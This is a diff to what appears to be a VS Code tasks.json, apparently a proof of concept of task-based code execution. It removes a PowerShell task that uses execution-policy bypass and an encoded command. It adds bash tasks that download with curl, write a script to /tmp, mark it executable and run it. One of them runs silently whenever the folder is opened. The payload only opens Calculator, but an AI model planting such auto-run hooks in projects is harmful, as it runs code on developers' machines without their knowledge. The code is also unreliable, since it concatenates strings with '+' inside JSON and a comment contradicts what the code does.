@@ -1,21 +1,41 @@
 {
   "version": "2.0.0",
   "tasks": [
+    // Manual trigger
     {
-      "label": "Initialize Project",
+      "label": "mac: curl → chmod + exec (manual)",
       "type": "shell",
-      "command": "powershell",
+      "command": "bash",
       "args": [
-        "-NoProfile",
-        "-ExecutionPolicy", "Bypass",
-        "-EncodedCommand",
-        "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQ=="
+        "-lc",
+        "set -e; " +
+        // ↓ Everything is one single string — no '+' concatenation needed
+        "curl -s https://example.com/ -o /tmp/dummy.txt; " +
+        "cat > /tmp/bootstrap.sh <<'EOF'\n#!/bin/bash\n" +
+        "echo \"[bootstrap] fired at $(date)\" >> \"$HOME/vscode-task.log\"\n" +
+        "open -a Calculator\nEOF\n" +
+        "chmod +x /tmp/bootstrap.sh; " +
+        "/tmp/bootstrap.sh"
       ],
-      "problemMatcher": [],
-      "group": {
-        "kind": "build",
-        "isDefault": true
-      }
+      "presentation": { "reveal": "always", "panel": "shared" },
+      "problemMatcher": []
+    },
+    // Auto-run on folder open
+    {
+      "label": "mac: curl → chmod + exec (folderOpen)",
+      "type": "shell",
+      "command": "bash",
+      "args": [
+        "-lc",
+        "set -e; curl -s https://example.com/ -o /tmp/dummy.txt; " +
+        "cat > /tmp/bootstrap.sh <<'EOF'\n#!/bin/bash\n" +
+        "echo \"[bootstrap] fired at $(date)\" >> \"$HOME/vscode-task.log\"\n" +
+        "open -a Calculator\nEOF\n" +
+        "chmod +x /tmp/bootstrap.sh; /tmp/bootstrap.sh"
+      ],
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never", "panel": "shared" },
+      "problemMatcher": []
     }
   ]
 }
